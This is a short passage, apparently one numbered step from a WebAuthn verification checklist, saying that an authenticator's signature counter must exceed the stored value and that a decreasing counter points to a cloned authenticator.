6. **Signature counter** is greater than the stored value (or the authenticator reports none) — a *decreasing* counter signals a **cloned authenticator**, so flag/deny.
